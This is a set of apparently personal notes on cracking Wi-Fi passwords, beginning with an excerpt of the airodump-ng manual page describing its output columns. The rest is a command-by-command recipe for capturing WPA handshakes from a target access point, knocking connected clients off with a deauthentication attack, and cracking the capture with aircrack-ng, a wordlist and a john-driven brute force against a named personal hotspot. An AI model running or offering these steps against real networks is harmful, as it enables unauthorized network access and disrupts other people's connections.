		1. WEP
		2. WPA|WPA2

BSSID  MAC address of the access point. In the Client section, a BSSID of "(not associated)" means that the client
              is not associated with any AP. In this unassociated state, it is searching for an AP to connect with.

       PWR    Signal  level  reported by the card. Its signification depends on the driver, but as the signal gets higher
              you get closer to the AP or the station. If the BSSID PWR is -1, then the  driver  doesn't  support  signal
              level  reporting.  If  the  PWR is -1 for a limited number of stations then this is for a packet which came
              from the AP to the client but the client transmissions are out of range for  your  card.  Meaning  you  are
              hearing only 1/2 of the communication. If all clients have PWR as -1 then the driver doesn't support signal
              level reporting.

       RXQ    Only shown when on a fixed channel. Receive Quality as measured by the percentage  of  packets  (management
              and data frames) successfully received over the last 10 seconds. It's measured over all management and data
              frames. That's the clue, this allows you to read more things out of this value. Lets say you got  100  per‐
              cent  RXQ and all 10 (or whatever the rate) beacons per second coming in. Now all of a sudden the RXQ drops
              below 90, but you still capture all sent beacons. Thus you know that the AP is sending frames to  a  client
              but  you  can't  hear the client nor the AP sending to the client (need to get closer). Another thing would
              be, that you got a 11MB card to monitor and capture frames (say a prism2.5) and you have a very good  posi‐
              tion  to  the  AP. The AP is set to 54MBit and then again the RXQ drops, so you know that there is at least
              one 54MBit client connected to the AP.

       Beacons
              Number of beacons sent by the AP. Each access point sends about ten beacons per second at the  lowest  rate
              (1M), so they can usually be picked up from very far.

       #Data  Number of captured data packets (if WEP, unique IV count), including data broadcast packets.

       #/s    Number of data packets per second measure over the last 10 seconds.

       CH     Channel  number  (taken from beacon packets). Note: sometimes packets from other channels are captured even
              if airodump-ng is not hopping, because of radio interference.

       MB     Maximum speed supported by the AP. If MB = 11, it's 802.11b, if MB = 22 it's 802.11b+ and higher rates  are
              802.11g. The dot (after 54 above) indicates short preamble is supported. 'e' indicates that the network has
              QoS (802.11e) enabled.

       ENC    Encryption algorithm in use. OPN = no encryption,"WEP?" = WEP or higher (not enough data to choose  between
              WEP and WPA/WPA2), WEP (without the question mark) indicates static or dynamic WEP, and WPA or WPA2 if TKIP
              or CCMP or MGT is present.

       CIPHER The cipher detected. One of CCMP, WRAP, TKIP, WEP, WEP40, or WEP104. Not mandatory, but TKIP  is  typically
              used  with  WPA and CCMP is typically used with WPA2. WEP40 is displayed when the key index is greater then
              0. The standard states that the index can be 0-3 for 40bit and should be 0 for 104 bit.

       AUTH   The authentication protocol used. One of MGT (WPA/WPA2 using a separate authentication server), SKA (shared
              key for WEP), PSK (pre-shared key for WPA/WPA2), or OPN (open for WEP).

       WPS    This is only displayed when --wps (or -W) is specified. If the AP supports WPS, the first field of the col‐
              umn indicates version supported. The second field indicates WPS  config  methods  (can  be  more  than  one
              method,  separated  by  comma):  USB  = USB method, ETHER = Ethernet, LAB = Label, DISP = Display, EXTNFC =
              External NFC, INTNFC = Internal NFC, NFCINTF = NFC Interface, PBC = Push Button, KPAD =  Keypad. Locked  is
              displayed when AP setup is locked.

       ESSID  The so-called "SSID", which can be empty if SSID hiding is activated. In this case, airodump-ng will try to
              recover the SSID from probe responses and association requests.

#airodump-ng wlan0mon
	bssid 				channel number
#airodump-ng --bssid <Target's BSSID> -c <Target's Channel Number> -w <File Name In Which I want To Capture the Beacons --> aranjit> wlan0mon
	Wait until the beacons number reaches to 25,000

When there is a new device connecting
-------------------------------------
#iwconfig
#airmon-ng 
#airmon-ng start wlan0
#iwconfig
#airodump-ng wlan0mon
	bssid 				channel number
#airodump-ng --bssid <Target's BSSID> -c <Target's Channel Number> -w <File Name In Which I want To Capture the Beacons --> aranjit> wlan0mon
	It will help you to get the WPA handshake
#aircrack-ng -w /usr/share/wordlists/rockyou.txt aranjit-01.cap


When there is no new device connecting
-------------------------------------
#iwconfig
#airmon-ng

	bssid 				channel number
#airodump-ng --bssid <Target's BSSID> -c <Target's Channel Number> -w <File Name In Which I want To Capture the Beacons --> aranjit> wlan0mon
	It will help you to get the WPA handshake
#aireplay-ng -0 10 -a <Router's BSSID> -c <Station's BSSID> wlan0mon
	This will make us capture the handshake
#aircrack-ng -w /usr/share/wordlists/rockyou.txt aranjit-01.cap


Brute Force
-----------
#john --incremental --stdout | aircrack-ng -e "Shubhasmit's iPhone" -w- filename-01.cap
	Where filename-01.cap is the file created using airodump-ng.
